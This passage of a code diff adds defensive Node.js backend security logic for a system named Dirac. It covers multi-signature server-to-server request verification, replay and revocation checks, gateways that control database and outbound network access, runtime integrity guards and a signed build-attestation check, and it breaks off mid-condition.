+  if (!registryLookup || registryLookup.ok !== true) return { ...base, reason: 's2s_registry_store_unavailable', unavailable: true };
+  const entry = registryLookup.found ? registryLookup.entry : null;
+  if (!entry || String(entry.status || '').toLowerCase() !== 'active' || diracS2SKeyVersionV206(entry.key_version) !== keyVersion) return { ...base, reason: 's2s_registry_or_key_version_invalid' };
+  const allowedTargets = Array.isArray(entry.allowed_targets) ? entry.allowed_targets.map(diracS2SIdV206) : [];
+  const allowedActions = Array.isArray(entry.allowed_actions) ? entry.allowed_actions.map((item) => String(item || '').trim().toLowerCase()) : [];
+  if (!allowedTargets.includes(localServerId) || !allowedActions.includes(String(ctx && ctx.action || '').toLowerCase())) return { ...base, reason: 's2s_scope_not_allowed' };
+  const revocation = await diracS2SCheckRevocationLocalV206(serverId, keyVersion);
+  if (!revocation.ok) return { ...base, reason: 's2s_revocation_store_unavailable', unavailable: true };
+  if (revocation.revoked) return { ...base, reason: 's2s_key_revoked', revoked: true };
+  const publicKeys = entry.public_keys && typeof entry.public_keys === 'object' ? entry.public_keys : {};
+  const message = diracS2SCanonicalV206({ networkId: expectedNetworkId, serverId, targetServerId, keyVersion, method: ctx.method, path: diracS2SPathV206(req), action: ctx.action, timestamp: timestampText, nonce, requestId, bodyHash: suppliedBodyHash });
+  let validCount = 0;
+  const failures = [];
+  try {
+    for (const spec of diracS2SSignatureSpecsV206()) {
+      let valid = false;
+      let signature = null;
+      try {
+        const rawSignature = diracS2SHeaderV206(req, 'x-dirac-signature-' + spec.index);
+        signature = diracS2SDecodeSignatureV210(rawSignature);
+        const publicRaw = String(publicKeys[spec.name] || '').trim();
+        const key = diracS2SKeyObjectV206(publicRaw, 'public', spec.type);
+        diracS2SAssertEcCurveV206(key, spec.curve);
+        valid = spec.verify(message, key, signature) === true;
+      } catch (_) { valid = false; }
+      finally { if (Buffer.isBuffer(signature)) signature.fill(0); }
+      if (valid) validCount += 1;
+      else failures.push(spec.index);
+    }
+  } finally {
+    message.fill(0);
+  }
+  const verification = { ...base, validCount, failures, reason: failures.length ? 's2s_seven_signature_invalid' : '', ok: failures.length === 0 };
+  if (!verification.ok) return verification;
+  const replayKey = 's2s-replay:' + serverId + ':' + keyVersion + ':' + requestId + ':' + nonce;
+  if (typeof claimPersistentSecurityKeyOnceV194 !== 'function') return { ...verification, ok: false, unavailable: true, reason: 's2s_replay_store_unavailable' };
+  const claimed = await claimPersistentSecurityKeyOnceV194(replayKey, { type: 'dirac_s2s_replay_claim_v206', server_id: serverId, key_version: keyVersion, request_id: requestId, nonce, created_at: new Date().toISOString() }, 180);
+  if (!claimed) return { ...verification, ok: false, reason: 's2s_replay_detected' };
+  return verification;
+}
+
+async function diracS2SProcessSecurityReportV206(ctx) {
+  const body = ctx && ctx.body && typeof ctx.body === 'object' ? ctx.body : {};
+  const event = String(body.event || '').trim().toLowerCase();
+  const reporterServerId = diracS2SIdV206(diracS2SHeaderV206(ctx.req, 'x-dirac-server-id'));
+  if (event === 'revocation_check') {
+    const offenderServerId = diracS2SIdV206(body.offender_server_id);
+    const offenderKeyVersion = diracS2SKeyVersionV206(body.offender_key_version);
+    if (!offenderServerId || !offenderKeyVersion) return { ok: false, reason: 'security_report_revocation_identity_invalid' };
+    const status = await diracS2SCheckRevocationLocalV206(offenderServerId, offenderKeyVersion);
+    if (!status.ok) return { ok: false, reason: 'security_report_revocation_store_unavailable', unavailable: true };
+    return { ok: true, response: { ok: true, event: 'revocation_check', offender_server_id: offenderServerId, offender_key_version: offenderKeyVersion, revoked: status.revoked === true } };
+  }
+  if (event !== 'signature_failure') return { ok: false, reason: 'security_report_event_invalid' };
+  const evidence = body.evidence && typeof body.evidence === 'object' && !Array.isArray(body.evidence) ? { ...body.evidence } : null;
+  if (!evidence) return { ok: false, reason: 'security_report_evidence_missing' };
+  const suppliedEvidenceHash = String(evidence.evidence_hash || '').toLowerCase();
+  delete evidence.evidence_hash;
+  const expectedEvidenceHash = crypto.createHash('sha512').update(diracS2SStableJsonV206(evidence), 'utf8').digest('hex');
+  evidence.evidence_hash = suppliedEvidenceHash;
+  if (!/^[a-f0-9]{128}$/.test(suppliedEvidenceHash) || !(typeof safeEqual === 'function' ? safeEqual(suppliedEvidenceHash, expectedEvidenceHash) : suppliedEvidenceHash === expectedEvidenceHash)) return { ok: false, reason: 'security_report_evidence_hash_invalid' };
+  if (diracS2SIdV206(evidence.reporter_server_id) !== reporterServerId || Number(evidence.attributed_valid_signature_count || 0) < 1) return { ok: false, reason: 'security_report_reporter_or_attribution_invalid' };
+  const incidentId = String(evidence.incident_id || '').trim();
+  if (!/^[A-Za-z0-9_-]{16,180}$/.test(incidentId)) return { ok: false, reason: 'security_report_incident_id_invalid' };
+  const incidentKey = 's2s-incident:' + incidentId;
+  const existingIncident = await readPersistentSecurityJsonStrictV194(incidentKey);
+  if (!existingIncident.ok) return { ok: false, reason: 'security_report_incident_store_unavailable', unavailable: true };
+  if (existingIncident.found) {
+    const existingHash = String(existingIncident.record && existingIncident.record.evidence_hash || '');
+    if (!(typeof safeEqual === 'function' ? safeEqual(existingHash, suppliedEvidenceHash) : existingHash === suppliedEvidenceHash)) return { ok: false, reason: 'security_report_incident_conflict' };
+    return { ok: true, response: { ok: true, event: 'signature_failure', incident_id: incidentId, offender_server_id: diracS2SIdV206(evidence.offender_server_id), offender_key_version: diracS2SKeyVersionV206(evidence.offender_key_version), revoked: true, evidence_hash: suppliedEvidenceHash, idempotent: true } };
+  }
+  const claimKey = 's2s-incident-claim:' + incidentId;
+  const incidentClaim = await claimPersistentSecurityKeyOnceV194(claimKey, { type: 'dirac_s2s_incident_claim_v206', incident_id: incidentId, evidence_hash: suppliedEvidenceHash, reporter_server_id: reporterServerId }, Math.ceil(diracCentralBlockMsV146() / 1000));
+  if (!incidentClaim) {
+    const existingClaim = await readPersistentSecurityJsonStrictV194(claimKey);
+    const existingClaimHash = String(existingClaim && existingClaim.record && existingClaim.record.evidence_hash || '');
+    if (!existingClaim.ok || !existingClaim.found || !(typeof safeEqual === 'function' ? safeEqual(existingClaimHash, suppliedEvidenceHash) : existingClaimHash === suppliedEvidenceHash)) return { ok: false, reason: 'security_report_incident_replay' };
+  }
+  const revoked = await diracS2SApplyRevocationV206(evidence);
+  if (!revoked) return { ok: false, reason: 'security_report_revocation_persistence_failed', unavailable: true };
+  const incidentStored = await writePersistentSecurityJsonRequiredV194(incidentKey, { type: 'dirac_s2s_incident_v206', ...evidence, accepted_by: diracS2SIdV206(diracS2STextV206('DIRAC_S2S_SERVER_ID')), accepted_at: new Date().toISOString() }, Number(evidence.detected_at_ms || Date.now()) + diracCentralBlockMsV146(), Math.ceil(diracCentralBlockMsV146() / 1000));
+  if (!incidentStored) return { ok: false, reason: 'security_report_incident_persistence_failed', unavailable: true };
+  return { ok: true, response: { ok: true, event: 'signature_failure', incident_id: incidentId, offender_server_id: diracS2SIdV206(evidence.offender_server_id), offender_key_version: diracS2SKeyVersionV206(evidence.offender_key_version), revoked: true, evidence_hash: suppliedEvidenceHash } };
+}
+
+if (process.env.NODE_ENV === 'production') diracS2SAssertConfigurationV206();
+
+
+/* ============================================================
+   v202 CENTRALIZED ACTION POLICY AND GATEWAYS
+   ============================================================ */
+function diracV202BuildActionPolicyTable() {
+  const actions = Array.from(new Set([
+    ...DIRAC_CENTRAL_ACTIVE_ACTIONS_V146,
+    ...DIRAC_CENTRAL_DISABLED_ACTIONS_V146
+  ])).sort();
+  const table = Object.create(null);
+  for (const action of actions) {
+    const contract = diracCentralContractForActionV146(action);
+    const classification = diracCentralClassifyActionV146(action);
+    const isSecurityReportHybrid = action === 'security_report';
+    const isPublicAuthentication = action === 'domain_login' || action === 'domain_register' || classification === 'public_read';
+    const mutation = Boolean(contract && contract.mutation);
+    table[action] = Object.freeze({
+      methods: Object.freeze(Array.from(contract.methods || [])),
+      authentication: isSecurityReportHybrid ? 'hybrid_server_or_browser' : classification === 'server' ? 'server' : classification === 'admin' ? 'admin' : isPublicAuthentication ? 'public' : 'customer',
+      csrf: mutation && classification !== 'server' && classification !== 'public_read',
+      bodyLimit: Number(contract.maxBodyBytes || 0),
+      rateLimit: 'central_distributed',
+      ownership: DIRAC_CENTRAL_USER_DATA_ACTIONS_V146.has(action) || DIRAC_CENTRAL_SENSITIVE_ACTIONS_V146.has(action),
+      mfa: action === 'customer_security_features_bundle_v2' || action === 'customer_security_features_bundle_v3',
+      a2f: DIRAC_CENTRAL_A2F_ACTIONS_V148.has(action),
+      browserRequired: isSecurityReportHybrid || classification === 'browser' || classification === 'admin',
+      serverToServer: isSecurityReportHybrid || classification === 'server',
+      allowedOrigins: Object.freeze(classification === 'server' ? [] : Array.from(DIRAC_CENTRAL_ALLOWED_ORIGINS_V146)),
+      databaseScope: classification === 'admin' ? 'admin_scoped' : classification === 'server' ? 'server_scoped' : 'owner_scoped',
+      egressScope: 'secure_egress_gateway',
+      responsePolicy: 'secure_response_gateway_no_store',
+      disabled: DIRAC_CENTRAL_DISABLED_ACTIONS_V146.has(action)
+    });
+  }
+  return Object.freeze(table);
+}
+const ACTION_POLICY = diracV202BuildActionPolicyTable();
+
+DIRAC_CENTRAL_SELF_TEST_V221 = diracCentralSelfTestRunV221();
+if (!DIRAC_CENTRAL_SELF_TEST_V221.ok) {
+  throw new Error('DIRAC_V221_SELF_TEST_FAILED:' + DIRAC_CENTRAL_SELF_TEST_V221.failures.join(','));
+}
+const DIRAC_CENTRAL_STARTUP_INTEGRITY_V221 = diracCentralPipelineIntegrityV221(null);
+if (!DIRAC_CENTRAL_STARTUP_INTEGRITY_V221.ok) {
+  throw new Error('DIRAC_V221_STARTUP_INTEGRITY_FAILED:' + DIRAC_CENTRAL_STARTUP_INTEGRITY_V221.reason);
+}
+
+const __diracV202DatabaseGatewayDelegate = supabaseFetch;
+async function secureDatabaseGateway(ctx, operation) {
+  const op = operation && typeof operation === 'object' ? operation : null;
+  if (!op || typeof op.path !== 'string' || !op.options || typeof op.options !== 'object') {
+    return { ok: false, status: 500, data: { code: 'DIRAC_DATABASE_GATEWAY_OPERATION_INVALID' } };
+  }
+  const contextDecision = diracCentralGatewayContextAllowedV211(ctx);
+  if (!contextDecision.ok) {
+    diracCentralEmitDebugV211(ctx, 'database_gateway_blocked', { phase: contextDecision.phase, path: String(op.path || '').split('?')[0].slice(0, 160) });
+    return { ok: false, status: 403, data: { code: 'DIRAC_DATABASE_GATEWAY_CONTEXT_NOT_AUTHORIZED' } };
+  }
+  if (contextDecision.phase === 'handler' && (!ctx.action || !ACTION_POLICY[ctx.action] || ctx.policy !== ACTION_POLICY[ctx.action])) {
+    return { ok: false, status: 403, data: { code: 'DIRAC_DATABASE_GATEWAY_POLICY_MISSING' } };
+  }
+  const callerEvidence = diracCentralDatabaseCallerEvidenceV230();
+  const permit = diracCentralCreateDatabaseEgressPermitV230(ctx, op, callerEvidence);
+  if (!permit || !DIRAC_CENTRAL_DATABASE_EGRESS_CONTEXT_V230) {
+    return { ok: false, status: 403, data: { code: 'DIRAC_DATABASE_EGRESS_PERMIT_REJECTED' } };
+  }
+  ctx.__diracCentralDatabaseGatewayDepthV211 = Number(ctx.__diracCentralDatabaseGatewayDepthV211 || 0) + 1;
+  try {
+    return await DIRAC_CENTRAL_DATABASE_EGRESS_CONTEXT_V230.run(permit, () => __diracV202DatabaseGatewayDelegate(op.path, op.options));
+  } finally {
+    ctx.__diracCentralDatabaseGatewayDepthV211 = Math.max(0, Number(ctx.__diracCentralDatabaseGatewayDepthV211 || 1) - 1);
+  }
+}
+supabaseFetch = async function supabaseFetchV202Gateway(path, options = {}) {
+  return secureDatabaseGateway(diracCentralCurrentContextV149(), { path: String(path || ''), options });
+};
+Object.defineProperty(supabaseFetch, '__diracV202SecureDatabaseGateway', { value: true, enumerable: false });
+
+const __diracV202EgressGatewayDelegate = globalThis.fetch.bind(globalThis);
+async function secureEgressGateway(ctx, requestConfig) {
+  const config = requestConfig && typeof requestConfig === 'object' ? requestConfig : null;
+  if (!config || config.input === undefined) {
+    const error = new Error('DIRAC_EGRESS_GATEWAY_OPERATION_INVALID');
+    error.code = 'DIRAC_EGRESS_GATEWAY_OPERATION_INVALID';
+    throw error;
+  }
+  const contextDecision = diracCentralGatewayContextAllowedV211(ctx);
+  if (!contextDecision.ok) {
+    diracCentralEmitDebugV211(ctx, 'egress_gateway_blocked', { phase: contextDecision.phase });
+    const error = new Error('DIRAC_EGRESS_GATEWAY_CONTEXT_NOT_AUTHORIZED');
+    error.code = 'DIRAC_EGRESS_GATEWAY_CONTEXT_NOT_AUTHORIZED';
+    throw error;
+  }
+  if (contextDecision.phase === 'handler' && (!ctx.action || !ACTION_POLICY[ctx.action] || ctx.policy !== ACTION_POLICY[ctx.action])) {
+    const error = new Error('DIRAC_EGRESS_GATEWAY_POLICY_MISSING');
+    error.code = 'DIRAC_EGRESS_GATEWAY_POLICY_MISSING';
+    throw error;
+  }
+  return __diracV202EgressGatewayDelegate(config.input, config.options);
+}
+globalThis.fetch = async function fetchV202Gateway(input, options) {
+  return secureEgressGateway(diracCentralCurrentContextV149(), { input, options });
+};
+const DIRAC_V228_FINAL_FETCH_GATEWAY = globalThis.fetch;
+try {
+  Object.defineProperty(globalThis, 'fetch', {
+    value: DIRAC_V228_FINAL_FETCH_GATEWAY,
+    writable: false,
+    configurable: false,
+    enumerable: true
+  });
+} catch (error) {
+  throw new Error('DIRAC_V228_FINAL_FETCH_LOCK_FAILED', { cause: error });
+}
+Object.defineProperty(globalThis, '__DIRAC_V202_SECURE_EGRESS_GATEWAY__', {
+  value: true,
+  writable: false,
+  configurable: false,
+  enumerable: false
+});
+
+
+const DIRAC_CENTRAL_SECURE_DATABASE_GATEWAY_V230 = supabaseFetch;
+const DIRAC_CENTRAL_GUARD_REFERENCE_LIST_V230 = Object.freeze([
+  diracCentralRawRequestHeaderGuardV228,
+  diracCentralCaptureRawRequestV230,
+  diracCentralAdvancedContractGuardV221,
+  diracCentralA2FRequestSignatureGuardV148,
+  diracCentralAtomicConsumeV230,
+  diracCentralAtomicRateLimitV230,
+  diracCentralEgressRouteAllowedV228,
+  diracCentralInspectEgressV146,
+  diracCentralPinnedHttpsFetchV230,
+  diracCentralFetchWithRedirectGuardV146,
+  diracCentralGuardEgressResponseV228,
+  diracCentralSecureJsonSerializeV230,
+  diracCentralDatabaseCallerEvidenceV230,
+  diracCentralCreateDatabaseEgressPermitV230,
+  diracCentralDirectNetworkBypassBlockedV230,
+  diracCentralNativeNetworkSurfaceIntactV231
+]);
+function diracCentralRuntimeReferenceHashV230() {
+  const source = DIRAC_CENTRAL_GUARD_REFERENCE_LIST_V230.map((fn) => Function.prototype.toString.call(fn)).join('\n---DIRAC-V230---\n');
+  const registry = [
+    ...Array.from(DIRAC_CENTRAL_DATABASE_TABLES_V230).sort(),
+    ...Array.from(DIRAC_CENTRAL_DATABASE_RPCS_V230).sort(),
+    ...Object.entries(DIRAC_CENTRAL_DATABASE_RPC_ACTIONS_V230)
+      .map(([rpc, action]) => rpc + '=>' + action)
+      .sort()
+  ].join('|');
+  return crypto.createHash('sha256').update(source + '|' + registry).digest('hex');
+}
+const DIRAC_CENTRAL_RUNTIME_REFERENCE_HASH_V230 = diracCentralRuntimeReferenceHashV230();
+
+function diracCentralDirectNetworkBypassBlockedV230() {
+  const error = Object.assign(new Error('DIRAC_DIRECT_NETWORK_BYPASS_BLOCKED'), { code: 'DIRAC_DIRECT_NETWORK_BYPASS_BLOCKED' });
+  throw error;
+}
+const DIRAC_CENTRAL_BLOCKED_HTTP_REQUEST_V230 = function diracCentralBlockedHttpRequestV230() { return diracCentralDirectNetworkBypassBlockedV230(); };
+const DIRAC_CENTRAL_BLOCKED_HTTP_GET_V230 = function diracCentralBlockedHttpGetV230() { return diracCentralDirectNetworkBypassBlockedV230(); };
+const DIRAC_CENTRAL_BLOCKED_HTTPS_REQUEST_V230 = function diracCentralBlockedHttpsRequestV230() { return diracCentralDirectNetworkBypassBlockedV230(); };
+const DIRAC_CENTRAL_BLOCKED_HTTPS_GET_V230 = function diracCentralBlockedHttpsGetV230() { return diracCentralDirectNetworkBypassBlockedV230(); };
+const DIRAC_CENTRAL_BLOCKED_NET_CONNECT_V230 = function diracCentralBlockedNetConnectV230() { return diracCentralDirectNetworkBypassBlockedV230(); };
+const DIRAC_CENTRAL_BLOCKED_TLS_CONNECT_V230 = function diracCentralBlockedTlsConnectV230() { return diracCentralDirectNetworkBypassBlockedV230(); };
+const DIRAC_CENTRAL_BLOCKED_HTTP2_CONNECT_V230 = function diracCentralBlockedHttp2ConnectV230() { return diracCentralDirectNetworkBypassBlockedV230(); };
+const DIRAC_CENTRAL_BLOCKED_DGRAM_SOCKET_V230 = function diracCentralBlockedDgramSocketV230() { return diracCentralDirectNetworkBypassBlockedV230(); };
+const DIRAC_CENTRAL_BLOCKED_DNS_OPERATION_V230 = function diracCentralBlockedDnsOperationV230() { return diracCentralDirectNetworkBypassBlockedV230(); };
+const DIRAC_CENTRAL_BLOCKED_NETWORK_CONSTRUCTOR_V230 = function diracCentralBlockedNetworkConstructorV230() { return diracCentralDirectNetworkBypassBlockedV230(); };
+const DIRAC_CENTRAL_BLOCKED_SOCKET_CONNECT_V230 = function diracCentralBlockedSocketConnectV230() { return diracCentralDirectNetworkBypassBlockedV230(); };
+const DIRAC_CENTRAL_BLOCKED_WEBSOCKET_V230 = function diracCentralBlockedWebSocketV230() { return diracCentralDirectNetworkBypassBlockedV230(); };
+const DIRAC_CENTRAL_BLOCKED_AGENT_V230 = Object.freeze({
+  addRequest: DIRAC_CENTRAL_BLOCKED_NETWORK_CONSTRUCTOR_V230,
+  createConnection: DIRAC_CENTRAL_BLOCKED_NETWORK_CONSTRUCTOR_V230,
+  getName: DIRAC_CENTRAL_BLOCKED_NETWORK_CONSTRUCTOR_V230
+});
+
+const DIRAC_CENTRAL_NATIVE_NETWORK_SURFACE_V231 = Object.freeze({
+  httpRequest: require('http').request,
+  httpGet: require('http').get,
+  httpClientRequest: require('http').ClientRequest,
+  httpAgent: require('http').Agent,
+  httpGlobalAgent: require('http').globalAgent,
+  httpWebSocket: require('http').WebSocket,
+  httpsRequest: require('https').request,
+  httpsGet: require('https').get,
+  httpsAgent: require('https').Agent,
+  httpsGlobalAgent: require('https').globalAgent,
+  netConnect: require('net').connect,
+  netCreateConnection: require('net').createConnection,
+  netSocketConnect: require('net').Socket.prototype.connect,
+  tlsConnect: require('tls').connect,
+  http2Connect: require('http2').connect,
+  dgramCreateSocket: require('dgram').createSocket,
+  dnsResolver: require('dns').Resolver,
+  dnsPromisesResolver: require('dns').promises.Resolver,
+  dnsLookup: require('dns').lookup,
+  dnsResolve: require('dns').resolve,
+  dnsResolve4: require('dns').resolve4,
+  dnsResolve6: require('dns').resolve6,
+  dnsResolveCname: require('dns').resolveCname,
+  dnsReverse: require('dns').reverse,
+  dnsPromisesLookup: require('dns').promises.lookup,
+  dnsPromisesResolve: require('dns').promises.resolve,
+  dnsPromisesResolve4: require('dns').promises.resolve4,
+  dnsPromisesResolve6: require('dns').promises.resolve6,
+  dnsPromisesResolveCname: require('dns').promises.resolveCname,
+  dnsPromisesReverse: require('dns').promises.reverse,
+  globalWebSocket: typeof globalThis.WebSocket === 'function' ? globalThis.WebSocket : null
+});
+
+function diracCentralNativeNetworkSurfaceIntactV231() {
+  const http = require('http');
+  const https = require('https');
+  const net = require('net');
+  const tls = require('tls');
+  const http2 = require('http2');
+  const dgram = require('dgram');
+  const dns = require('dns');
+  const dnsPromises = dns.promises;
+  const native = DIRAC_CENTRAL_NATIVE_NETWORK_SURFACE_V231;
+  return Boolean(
+    http.request === native.httpRequest
+    && http.get === native.httpGet
+    && http.ClientRequest === native.httpClientRequest
+    && http.Agent === native.httpAgent
+    && http.globalAgent === native.httpGlobalAgent
+    && http.WebSocket === native.httpWebSocket
+    && https.request === native.httpsRequest
+    && https.get === native.httpsGet
+    && https.Agent === native.httpsAgent
+    && https.globalAgent === native.httpsGlobalAgent
+    && net.connect === native.netConnect
+    && net.createConnection === native.netCreateConnection
+    && net.Socket.prototype.connect === native.netSocketConnect
+    && tls.connect === native.tlsConnect
+    && http2.connect === native.http2Connect
+    && dgram.createSocket === native.dgramCreateSocket
+    && dns.Resolver === native.dnsResolver
+    && dnsPromises.Resolver === native.dnsPromisesResolver
+    && dns.lookup === native.dnsLookup
+    && dns.resolve === native.dnsResolve
+    && dns.resolve4 === native.dnsResolve4
+    && dns.resolve6 === native.dnsResolve6
+    && dns.resolveCname === native.dnsResolveCname
+    && dns.reverse === native.dnsReverse
+    && dnsPromises.lookup === native.dnsPromisesLookup
+    && dnsPromises.resolve === native.dnsPromisesResolve
+    && dnsPromises.resolve4 === native.dnsPromisesResolve4
+    && dnsPromises.resolve6 === native.dnsPromisesResolve6
+    && dnsPromises.resolveCname === native.dnsPromisesResolveCname
+    && dnsPromises.reverse === native.dnsPromisesReverse
+    && (native.globalWebSocket === null
+      ? typeof globalThis.WebSocket !== 'function'
+      : globalThis.WebSocket === native.globalWebSocket)
+  );
+}
+
+function diracCentralLockBackendRuntimeV230() {
+  if (!DIRAC_CENTRAL_ASYNC_CONTEXT_V149 || !DIRAC_CENTRAL_DATABASE_EGRESS_CONTEXT_V230) {
+    throw new Error('DIRAC_RUNTIME_ASYNC_CONTEXT_REQUIRED');
+  }
+  if (!diracCentralNativeNetworkSurfaceIntactV231()) {
+    throw new Error('DIRAC_RUNTIME_NATIVE_NETWORK_SURFACE_MUTATED');
+  }
+  Object.defineProperty(globalThis, '__DIRAC_V230_RUNTIME_READY__', {
+    value: true,
+    writable: false,
+    configurable: false,
+    enumerable: false
+  });
+  return Object.freeze({
+    ok: true,
+    mode: 'native_network_integrity_non_invasive_v231',
+    referenceHash: DIRAC_CENTRAL_RUNTIME_REFERENCE_HASH_V230,
+    callsiteHash: DIRAC_CENTRAL_DATABASE_CALLSITES_HASH_V230,
+    callsiteCount: DIRAC_CENTRAL_DATABASE_CALLSITES_V230.size,
+    middlewareCount: __diracV202MiddlewareRegistry.length,
+    actionCount: Object.keys(ACTION_POLICY).length,
+    pipelineLength: SECURITY_PIPELINE.length
+  });
+}
+const DIRAC_CENTRAL_RUNTIME_LOCK_V230 = diracCentralLockBackendRuntimeV230();
+
+function diracCentralRuntimeInvariantGuardV230() {
+  const failures = [];
+  const expect = (condition, name) => { if (!condition) failures.push(name); };
+  expect(globalThis.__DIRAC_V230_RUNTIME_READY__ === true, 'runtime_ready_flag_invalid');
+  expect(DIRAC_CENTRAL_RUNTIME_LOCK_V230.mode === 'native_network_integrity_non_invasive_v231', 'runtime_lock_mode_invalid');
+  expect(globalThis.fetch === DIRAC_V228_FINAL_FETCH_GATEWAY, 'fetch_gateway_mutated');
+  expect(supabaseFetch === DIRAC_CENTRAL_SECURE_DATABASE_GATEWAY_V230, 'database_gateway_mutated');
+  expect(diracCentralNativeNetworkSurfaceIntactV231(), 'native_network_surface_mutated');
+  expect(DIRAC_CENTRAL_DATABASE_CALLSITES_V230.size === DIRAC_CENTRAL_RUNTIME_LOCK_V230.callsiteCount
+    && DIRAC_CENTRAL_DATABASE_CALLSITES_HASH_V230 === DIRAC_CENTRAL_RUNTIME_LOCK_V230.callsiteHash, 'database_callsite_registry_mutated');
+  expect(Object.isFrozen(__diracV202MiddlewareRegistry) && __diracV202MiddlewareRegistry.length === DIRAC_CENTRAL_RUNTIME_LOCK_V230.middlewareCount, 'middleware_registry_mutated');
+  expect(Object.isFrozen(SECURITY_PIPELINE) && SECURITY_PIPELINE.length === DIRAC_CENTRAL_RUNTIME_LOCK_V230.pipelineLength, 'security_pipeline_mutated');
+  expect(Object.isFrozen(ACTION_POLICY) && Object.keys(ACTION_POLICY).length === DIRAC_CENTRAL_RUNTIME_LOCK_V230.actionCount, 'action_policy_mutated');
+  expect(diracCentralRuntimeReferenceHashV230() === DIRAC_CENTRAL_RUNTIME_LOCK_V230.referenceHash, 'guard_reference_hash_mutated');
+  return Object.freeze({ ok: failures.length === 0, failures: Object.freeze(failures) });
+}
+
+async function diracCentralRunInternalComplianceContextV230(operation) {
+  if (typeof operation !== 'function' || !DIRAC_CENTRAL_ASYNC_CONTEXT_V149) throw new Error('DIRAC_INTERNAL_COMPLIANCE_CONTEXT_UNAVAILABLE');
+  const req = { method: 'POST', url: '/api/health?action=domain_health', headers: {}, query: { action: 'domain_health' } };
+  const ctx = {
+    req, res: {}, requestId: crypto.randomBytes(16).toString('hex'), action: 'domain_health', rawAction: 'domain_health',
+    method: 'POST', classification: 'public_read', executionPhaseV211: 'guard', currentStageV211: 'backend_compliance_gate',
+    currentStageIndexV211: 0, policy: ACTION_POLICY.domain_health || null
+  };
+  return DIRAC_CENTRAL_ASYNC_CONTEXT_V149.run({ ctx }, operation);
+}
+
+async function diracCentralSecurityTelemetryV230(event) {
+  const source = event && typeof event === 'object' ? event : {};
+  const eventType = String(source.event_type || 'central_security_event').toLowerCase().replace(/[^a-z0-9._:-]+/g, '_').slice(0, 120);
+  const severity = ['info', 'warning', 'high', 'critical'].includes(String(source.severity || 'warning')) ? String(source.severity || 'warning') : 'warning';
+  const reasonCode = String(source.reason_code || '').replace(/[^A-Za-z0-9:._-]+/g, '_').slice(0, 160);
+  const safeEvent = diracCentralSecureJsonSerializeV230(source.event_json && typeof source.event_json === 'object' ? source.event_json : {});
+  return diracCentralRunInternalComplianceContextV230(async () => {
+    const result = await supabaseFetch('/rest/v1/rpc/dirac_central_security_log_v230', {
+      method: 'POST', auth: 'service', body: {
+        p_event_type: eventType || 'central_security_event', p_severity: severity,
+        p_request_id_hash: '', p_action_name: 'domain_health', p_reason_code: reasonCode, p_event_json: safeEvent
+      }
+    }).catch(() => null);
+    return Boolean(result && result.ok === true && result.data === true);
+  });
+}
+
+function secureResponseGateway(ctx, response) {
+  if (!response || typeof response !== 'object') return response;
+  diracCentralApplyHeadersV146(response);
+  diracCentralWrapJsonResponseV146(response);
+  if (ctx) ctx.responsePolicy = ctx.policy && ctx.policy.responsePolicy || 'secure_response_gateway_no_store';
+  return response;
+}
+
+__diracV202MiddlewareRegistryLockedV228 = true;
+Object.freeze(__diracV202MiddlewareRegistry);
+
+const __diracV202CompiledDispatcher = (() => {
+  let next = __diracV202BaseHandler;
+  for (const entry of __diracV202MiddlewareRegistry) {
+    if (!entry || typeof entry.fn !== 'function') throw new Error('DIRAC_V202_DISPATCH_ENTRY_INVALID');
+    const inner = next;
+    next = function diracV202CompiledMiddleware(req, res) {
+      return entry.fn(req, res, inner);
+    };
+  }
+  return next;
+})();
+async function diracV202Dispatcher(req, res) {
+  const ctx = diracCentralCurrentContextV149();
+  if (!diracCentralHandlerContextFullyPassedV211(ctx, req)) {
+    diracCentralEmitDebugV211(ctx, 'dispatcher_blocked', { reason: 'full_central_guard_passport_required' });
+    const error = new Error('DIRAC_V202_DISPATCH_BEFORE_FULL_CENTRAL_GUARD');
+    error.code = 'DIRAC_V202_DISPATCH_BEFORE_FULL_CENTRAL_GUARD';
+    throw error;
+  }
+  return __diracV202CompiledDispatcher(req, res);
+}
+
+function diracCentralVerifyBuildAttestationV230() {
+    const encoded = String(process.env.DIRAC_BACKEND_BUILD_ATTESTATION_V230 || '').trim();
+  const signature = String(process.env.DIRAC_BACKEND_BUILD_ATTESTATION_SIGNATURE_V230 || '').trim();
+  const publicKeyPem = String(process.env.DIRAC_BACKEND_ATTESTATION_PUBLIC_KEY_PEM || '').trim();
+  if (!encoded || !signature || !publicKeyPem) return { ok: false, reason: 'build_attestation_missing' };
+  let publicKey;
+  try { publicKey = crypto.createPublicKey(publicKeyPem); } catch (_) { return { ok: false, reason: 'build_attestation_public_key_invalid' }; }
+  if (!publicKey || publicKey.asymmetricKeyType !== 'ed25519') return { ok: false, reason: 'build_attestation_public_key_type_invalid' };
+  let signatureBytes;
+  try { signatureBytes = Buffer.from(signature, 'base64url'); } catch (_) { return { ok: false, reason: 'build_attestation_signature_encoding_invalid' }; }
+  if (signatureBytes.length !== 64 || !crypto.verify(null, Buffer.from(encoded, 'utf8'), publicKey, signatureBytes)) {
+    return { ok: false, reason: 'build_attestation_signature_invalid' };
+  }
+  const publicKeyDer = publicKey.export({ type: 'spki', format: 'der' });
+  const publicKeyFingerprint = crypto.createHash('sha256').update(publicKeyDer).digest('hex');
+  let payload;
+  try { payload = JSON.parse(Buffer.from(encoded, 'base64url').toString('utf8')); } catch (_) { return { ok: false, reason: 'build_attestation_payload_invalid' }; }
+  let actualHash = '';
+  try { actualHash = crypto.createHash('sha256').update(require('fs').readFileSync(__filename)).digest('hex'); } catch (_) { return { ok: false, reason: 'build_attestation_file_hash_unavailable' }; }
+  const now = Date.now();
+  const testedAt = Date.parse(String(payload.tested_at || ''));
+  const expiresAt = Date.parse(String(payload.expires_at || ''));
+  const mandatoryPassClaims = [
+    'syntax_test',
+    'unit_security_tests',
+    'adversarial_10000',
+    'replay_cross_instance',
+    'concurrency_race',
+    'ssrf',
+    'dns_rebinding',
+    'request_smuggling',
+    'sast',
+    'sca',
+    'secret_scan',
+    'artifact_hash'
+  ];
+  if (String(payload.attestation_type || '') !== 'dirac-backend-security-attestation-v230'
+      || String(payload.attestation_key_sha256 || '') !== publicKeyFingerprint
+      || String(payload.build_sha256 || '') !== actualHash
+      || String(payload.node_version || '') !== process.version
+      || String(payload.owasp_profile || '') !== 'OWASP-TOP-10-2025-BACKEND'
+      || String(payload.asvs_profile || '') !== 'OWASP-ASVS-5.0-L2-BACKEND'
+      || payload.owasp_backend_gate !== 'PASS'
+      || Number(payload.tests_passed) < 10000
+      || Number(payload.tests_failed) !== 0
+      || Number(payload.critical_open) !== 0
+      || Number(payload.high_open) !== 0
+      || mandatoryPassClaims.some((name) => String(payload[name] || '') !== 'PASS')
